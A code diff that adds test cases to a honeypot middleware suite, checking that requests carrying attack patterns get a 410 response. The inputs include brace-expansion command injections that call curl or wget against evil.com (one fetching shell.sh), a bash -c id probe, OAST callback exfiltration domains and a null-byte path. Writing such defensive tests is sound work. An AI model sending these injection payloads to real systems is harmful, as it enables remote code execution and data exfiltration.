@@ -206,6 +206,24 @@ describe('honeypot middleware', () => {
 		expect((await app.request('/$(pwd)/serverless.yml')).status).toBe(410);
 	});
 
+	it('blocks brace expansion injection', async () => {
+		const app = makeApp();
+		expect((await app.request('/{curl,http://evil.com}')).status).toBe(410);
+		expect((await app.request('/{wget,http://evil.com/shell.sh}')).status).toBe(410);
+		expect((await app.request('/{bash,-c,id}')).status).toBe(410);
+	});
+
+	it('blocks OAST callback exfiltration domains', async () => {
+		const app = makeApp();
+		expect((await app.request('/test.oast.site')).status).toBe(410);
+		expect((await app.request('/callback.oast.fun')).status).toBe(410);
+	});
+
+	it('blocks null byte injection', async () => {
+		const app = makeApp();
+		expect((await app.request('/admin%00.html')).status).toBe(410);
+	});
+
 	it('blocks log file and error_log probes', async () => {
 		const app = makeApp();
 
